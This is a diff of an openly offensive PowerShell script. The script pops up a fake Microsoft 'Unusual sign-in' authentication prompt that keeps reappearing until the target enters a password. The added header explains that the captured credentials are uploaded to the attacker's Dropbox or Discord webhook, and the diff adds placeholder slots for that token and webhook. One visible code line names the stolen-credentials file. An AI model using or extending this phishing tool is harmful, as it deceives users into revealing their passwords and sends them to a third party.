@@ -7,6 +7,28 @@
 #@  \/               /_____/_____/          \/            \/_____/_____/     \/        \/      \/               \/     \/          \/     \/  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
+<#
+.SYNOPSIS
+	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
+
+.DESCRIPTION 
+	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
+	This will be followed by a fake authentication ui prompt. 
+	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
+	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection
+
+.Link
+	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
+
+#>
+
+#------------------------------------------------------------------------------------------------------------------------------------
+# This is for if you want to host your own version of the script
+
+# $db = "YOUR-DROPBOX-ACCESS-TOKEN"
+
+# $dc = "YOUR-DISCORD-WEBHOOK"
+
 #------------------------------------------------------------------------------------------------------------------------------------
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
